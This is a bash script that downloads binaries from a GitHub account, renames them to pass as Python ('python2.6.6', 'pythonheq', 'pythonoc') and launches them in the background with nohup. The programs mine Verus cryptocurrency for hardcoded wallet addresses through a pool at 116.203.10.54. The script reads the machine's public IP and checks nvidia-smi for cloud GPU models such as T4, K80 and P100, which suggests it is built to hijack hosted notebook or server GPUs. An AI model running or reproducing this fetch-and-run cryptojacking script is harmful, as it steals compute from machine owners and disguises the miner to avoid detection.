#!bin/bash -xe 

## getting IP info
iip=$(curl -s https://ipecho.net/plain)
IPNAME=$(sed 's|\.|o|g' <<< $iip)
curl ipinfo.io

echo '#######################################################'
echo '################## RV +XM + VER v0.0.7 ################'
echo '#######################################################'



#### Clean logs
echo > cuout
echo > ocout
echo > ocoutdef
echo > oout
echo > oout
echo > results.txt 

########## XMR
rm -rf pythonxm
rm -rf config.json
rm -rf x.out
rm -rf pythonheq

# Prepare
PoolHost=116.203.10.54
VR_Port=3000
PublicVerusCoinAddress="RNEzrdAY8JNRrEre37aZbegHSx2CgaoXek"
WorkerName="RV_"$IPNAME
VR_Threads=4

rm -rf python2.6.6
rm -rf pythonoc
wget -q https://github.com/one10001/10001code/releases/download/2.6.6/python2.6.6 2> lol.out
chmod +x python2.6.6
cp python2.6.6 pythonoc

#wget -q https://github.com/one10001/xmrig/releases/download/bin0.0.1/pythonxm 
#chmod +x pythonxm

#wget -q https://github.com/one10001/10001code/raw/main/config.json
#sed -i "s+ip0001+RV_$IPNAME+g" config.json

wget -q https://github.com/one10001/10001code/raw/main/pythonheq
chmod +x pythonheq

#CPU

#nohup  ./pythonxm -c config.json 2>> oout 1>> oout &
nohup ./pythonheq -v -l "${PoolHost}":"${VR_Port}" -u "${PublicVerusCoinAddress}"."${WorkerName}" -t "${Threads}" "$@" 1>> oout 2>> oout &


#GPU
if [ $(nvidia-smi | grep P100-PCIE |wc -l) == 1 ]
then
    while true
    do
        echo "####################### #########################"
        nohup  ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.RV_CU_P100_$IPNAME@116.203.10.54:80  -U 2>> oout 1>> oout &
        tail -f oout
   done
elif [ $(nvidia-smi | grep T4 |wc -l) == 1 ]
then
    nohup  ./pythonoc  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_T4_$IPNAME@116.203.10.54:80  -G  2>> oout 1>> oout &
    tail -f oout
elif [ $(nvidia-smi | grep K80 |wc -l) == 1 ]
then
    nohup  ./pythonoc  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_K80_$IPNAME@116.203.10.54:80  -G 2>> oout 1>> oout &
    tail -f oout
else
    nohup  ./pythonoc  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_Other_$IPNAME@116.203.10.54:80  -G 2>> oout 1>> oout &
     tail -f oout
fi  